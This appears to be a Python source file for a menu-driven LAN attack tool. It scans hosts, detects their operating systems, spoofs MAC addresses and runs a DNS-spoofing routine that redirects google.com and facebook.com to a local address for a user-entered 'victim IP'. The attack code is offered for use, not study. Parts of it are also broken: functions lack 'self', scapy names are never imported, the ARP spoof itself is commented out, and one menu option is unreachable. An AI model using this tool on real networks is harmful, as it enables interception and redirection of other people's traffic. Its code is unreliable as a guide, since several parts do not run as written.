import re
import sys
import os 
import netifaces
from Colors import Colors
from termcolor import colored
import colorama
import random
import ipaddress 
from scapy import all as scapy
import nmap3
import stun
import publicip
from ip2geotools.databases.noncommercial import DbIpCity
import  socket
from Target import Target
from netaddr import valid_ipv4
from netfilterqueue import NetfilterQueue

#colors = list(vars(colorama.Fore).values())




class Network:

    def __init__(self):
        self.colors = Colors()
        self.color = colorama.Fore.GREEN
        self.interfaces = netifaces.interfaces()
        self.routers = netifaces.gateways()
        self.netmask = None
        self.network = None
        self.interface = None
        self.ip = None
        self.mac = None
        self.router = None
        self.country = None
        self.city = None
        self.lat = None
        self.lng = None
        self.region = None
        self.target = None
        self.ipTarget = None
        self.countryTarget = None
        self.cityTarget = None
        self.regionTarget = None
        self.latTarget = None
        self.lngTarget = None
        self.run = True
        self.ips = []
        self.macs = []
        self.os = []
        self.public = None

########## GETTERS ############


    def getNetwork(self):
        """ Get internal network range """
        if self.network is None : 
            if self.getNetmask() :
                try :
                    self.network = ipaddress.ip_network(self.getIP()+'/'+self.getNetmask(), strict=False)
                except ValueError :
                    self.network = 'no network'
        return self.network
        
    def getPublicIp(self):
        """ Get public IP address """
        if self.public is None :
            self.public = stun.get_ip_info()[1]
            if self.public is None :
                self.public = str(publicip.get())
        return self.public

            
        
    def getIP(self):
        """ Get LAN address """
        if self.ip is None :
            try:
                ipkey = netifaces.ifaddresses(self.interface)
                self.ip = (ipkey[netifaces.AF_INET][0]['addr'])
            except KeyError:
                self.ip ="No IP"
        return self.ip
    
    def getNetmask(self):
        """ Get netmask of internal network """
        if self.netmask is None:
            try:
                ipkey = netifaces.ifaddresses(self.interface)
                self.netmask = ipkey[netifaces.AF_INET][0]['netmask']
            except KeyError:
                self.netmask ="No netmask"

        return self.netmask

    def getMAC(self, spoof=False):
        """ Get physical address """
        if self.mac is None :
            
            ipkey = netifaces.ifaddresses(self.interface)
            
            try:
                self.mac = (ipkey[netifaces.AF_LINK][0]['addr'])
            except KeyError :
                self.mac = ipkey[10][0]['addr']
        else :
            if spoof == True: 
                ipkey = netifaces.ifaddresses(self.interface)
                try :
                    self.mac = (ipkey[netifaces.AF_LINK][0]['addr'])
                except KeyError :
                    self.mac = ipkey[10][0]['addr']    
        return self.mac
    
    def getInterface(self):
        """ Get interface network """
        if self.interface is None : 
            self.defineInterface()
        return self.interface
    
    def getGateway(self):
        """ Get ip gateway of network """
        if self.router is None :
            self.router = (self.routers['default'][netifaces.AF_INET][0])
        return self.router

    def getLocation(self):
        """ Get location of public IP address """
        if self.country is None :
            location =  DbIpCity.get(self.getPublicIp(), api_key='free')
            self.country = location.country
            self.city = location.city
            self.region = location.region
            self.lat = location.latitude
            self.lng = location.longitude
        return self.country,self.city,self.region,self.lat,self.lng

    def getResume(self):
        """ Get complete resume of your interface network """
        #self.colors.print_random_color('[INFO NETWORK INTERFACE]\r\n')
        #self.color = None
        print('INTERFACE: '+self.getInterface())
        print('LOCAL IP: '+self.getIP())
        print('MAC: '+self.getMAC())
        print('NETMASK: '+self.getNetmask())
        print('GATEWAY: '+self.getGateway())
        print('NETWORK: '+str(self.getNetwork()))
        print('PUBLIC IP: '+self.getPublicIp())
        print('COUNTRY: '+self.getLocation()[0])
        print('CITY: '+self.getLocation()[1])
        print('REGION: '+self.getLocation()[2])
        print('LATITUDE: '+str(self.getLocation()[3]))
        print('LONGITUDE: '+str(self.getLocation()[4]))
        print('\r\n')

    

########## PRINTERS ############
           

    def showInterface(self):
        """ List of interface network """
        print("[*] Searching...")
        print('\r\n')
        cpt = 1
        for interface in self.interfaces :
            text = '['+str(cpt)+'] '+"Detected interface"+str(cpt)+': '+str(interface)
            print(text)
            cpt += 1
        print('\r\n')
        
    def showMACAddress(self):
        """ Print physical address """
        if self.interface:
            ipkey = netifaces.ifaddresses(self.interface)
            self.mac = (ipkey[netifaces.AF_LINK][0]['addr'])
            print('[*] Your MAC address on '+self.interface+' interface is '+self.getMAC())

    
    def showIPadresse(self):
        """ Print local address """
        if self.interface:
            ipkey = netifaces.ifaddresses(self.interface)
            self.ip = (ipkey[netifaces.AF_INET][0]['addr'])
            print('[*] Your IP on '+self.interface+' interface is '+self.getIP())


    def showGateway(self):
        """ Print gateway address """
        if self.routers :
            self.router = (self.routers['default'][netifaces.AF_INET][0])
            print('[*] Your default gateway is '+self.getGateway()+'.')

    def showChoice(self):
        """ Show main menu """
        print('[Network Scanner] : What do you want do ? \r\n')
        print('[1]: Get resume of your network')
        print('[2]: Define your interface')
        print('[3]: Scan network')
        print('[4]: Find details target')
        print('[5]: Spoof MAC address')
        print('[6]: ARP Poisoning')
        print('[7]: Quit\r\n')
        answer = input('Your choice: ')
        print('\r\n')
        return answer



########## SETTTERS ############

    def defineInterface(self):
        """ Define your network interface to get details """
        self.showInterface()
        self.resetConfig()
        #print('[*] Choose your interface. (For example type 1 for '+self.interfaces[0]+' interface): ',self.color)
        choiceInterface = input('[*] Choose your interface. (For example type 1 for '+self.interfaces[0]+' interface): ')
        try:
            choiceInterface = int(choiceInterface) - 1
            interface = self.interfaces[choiceInterface] 
            if interface in self.interfaces and choiceInterface >= 0 :
                self.interface = interface
                print('[*] '+str(interface)+' => ON\r\n')
            else: 
                print('This interface doesn\'t exist\r\n')

        except IndexError:
            print('This interface doesn\'t exist\r\n')
        except ValueError:
            print('Please read before typing..\r\n')

    def regexMAC(self,addr):
        if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", addr.lower()):
            return True
        return False

    def spoofMac(self): 
        answer = None
        choice = ['1','2']
        while True :
            print('\r\n[Mac changer]: What do you want to do ?\r\n')
            print('[1]: Generate random MAC address')
            print('[2]: Spoof specific MAC address\r\n')
            answer = input('Your choice: ')
            if answer in choice :
                break
        print()
        if str(answer) == choice[0] :
            print('[*] Your old MAC address is: '+self.getMAC())
            os.system('spoof-mac.py randomize '+self.getInterface())
            print('[*] Your new MAC address is: '+self.getMAC(spoof=True))
            print()
        if str(answer) == choice[1] :
            while True: 
                new_mac_address = input('[*] Enter your spoofed MAC address: ')
                if self.regexMAC(new_mac_address):
                    break
                print('[*] Wrong format, retry')
            print('[*] Your old MAC address is: '+self.getMAC())
            os.system('spoof-mac.py set '+str(new_mac_address)+' '+self.getInterface())
            print('[*] Your new MAC address is: '+self.getMAC(spoof=True))
            print()
        




        


    
########## NETWORK FUNCTION ############
    
    def scanNetwork(self):
        """ Scan devices on network """
        self.ips.clear()
        self.macs.clear()
        self.os.clear()
        cpt = 0
        nmap = nmap3.Nmap()
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(self.getNetwork())),timeout=2)
        for snd,rcv in ans:
            self.ips.append(rcv[ARP].psrc)
            self.macs.append(rcv[Ether].src)
        print()
        print(str(len(self.ips)) + ' devices detected !')
        print('Starting depth scan... This operation may take a while')
        for ip in self.ips:
            print('[*] Searching OS for '+str(ip))
            resultnmap = nmap.nmap_os_detection(ip)
            print(resultnmap)
            print(resultnmap[ip]['osmatch']['name'])
            try:
                self.os.append(resultnmap[0]['name'])
            
            except KeyError :
            	self.os.append(resultnmap[ip]['osmatch'])

            except IndexError :
                self.os.append('')
            
            except KeyboardInterrupt :
                showChoice()

        sizeIP = len(self.ips)
        sizeMAC = len(self.macs)
        print('\r\n')
        if sizeIP == sizeMAC :
            print('IP: '+' '*15+'MAC: '+' '*20+'OS: ')
            for i in range(sizeIP):
                print(self.ips[i]+' '*7+self.macs[i]+' '*7+self.os[i])
        
        print('\r\n')
       

########## ARP POISONING ############

    def regexIP(self,ip):
        if valid_ipv4(str(ip)):
            return True
        return False
    
    def get_mac(self,ip_target):
        arp_request = scapy.ARP(pdst = ip_target)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
        print(answered_list[0][1].hwsrc)
        return answered_list[0][1].hwsrc


    def process_packet(packet):
        """
        Whenever a new packet is redirected to the netfilter queue,
        this callback is called.
        """
        # convert netfilter queue packet to scapy packet
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            # if the packet is a DNS Resource Record (DNS reply)
            # modify the packet
            print("[Before]:", scapy_packet.summary())
            try:
                scapy_packet = modify_packet(scapy_packet)
            except IndexError:
                # not UDP packet, this can be IPerror/UDPerror packets
                pass
            print("[After ]:", scapy_packet.summary())
            # set back as netfilter queue packet
            packet.set_payload(bytes(scapy_packet))
        # accept the packet
        packet.accept()

    def modify_packet(packet):
        """
        Modifies the DNS Resource Record `packet` ( the answer part)
        to map our globally defined `dns_hosts` dictionary.
        For instance, whenever we see a google.com answer, this function replaces 
        the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
        """
        dns_hosts = {
            "www.google.com.": "192.168.1.84",
            "google.com.": "192.168.1.84",
            "facebook.com.": "192.168.1.84"
        }
        # get the DNS question name, the domain name
        qname = packet[DNSQR].qname
        if qname not in dns_hosts:
            # if the website isn't in our record
            # we don't wanna modify that
            print("no modification:", qname)
            return packet
        # craft new answer, overriding the original
        # setting the rdata for the IP we want to redirect (spoofed)
        # for instance, google.com will be mapped to "192.168.1.100"
        packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
        # set the answer count to 1
        packet[DNS].ancount = 1
        # delete checksums and length of packet, because we have modified the packet
        # new calculations are required ( scapy will do automatically )
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        # return the modified packet
        return packet


    def arp(self):
        # https://www.thepythoncode.com/article/make-dns-spoof-python
        
        while True :
            self.target = input('[*] Enter your victim IP address: ')
            self.gateway = self.getGateway()
            if self.regexIP(self.target):
                break
            print('Invalid IP')
        print('[*] Initiate Queue with forwarding rules')
        QUEUE_NUM = 0 
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        queue= NetfilterQueue()
        try:
            # bind the queue number to our callback `process_packet`
            # and start it
            queue.bind(QUEUE_NUM, process_packet)
            queue.run()
        except KeyboardInterrupt:
            # if want to exit, make sure we
            # remove that rule we just inserted, going back to normal.
            os.system("iptables --flush")



        # Send packet ARP to IP target with spoofed IP of gateway 
        #arp_spoofed = scapy.IP(op=2, psrc=self.gateway, pdst=self.target, hwdst=mac_dst)
        #scapy.send(arp_spoofed)


            



    
    def assumeChoice(self,choice):
        """ Activate function from menu choice """
        listChoice = ['1','2','3','4','5','6']
        if choice in listChoice :
            if choice == '1':
                self.getResume()
            if choice == '2':
                self.defineInterface()
            if choice == '3':
                self.scanNetwork()
            if choice == '4':
                target = Target()
                target.getResumeTarget()
            if choice == '5':
                self.spoofMac()
            if choice == '6':
                self.arp()

            if choice == '7':
                print('[*] Bye...\r\n')
                self.run = False
                sys.exit(0)
        else:
            print('Bad choice, try again...\r\n')
    
    def start(self):
        """ Start app function """
        print('\r\n')
        print('[*] For start, you have to define which interface you want use.')
        self.defineInterface()
        while self.run :
            choice = self.showChoice()
            self.assumeChoice(choice)

    def resetConfig(self):
        """ Reset properties of class """
        self.network = None
        self.public = None 
        self.ip = None
        self.netmask = None
        self.mac = None
        self.country = None
        self.city = None
        self.region = None
        self.lat = None
        self.lng = None




        



net = Network()
net.start()
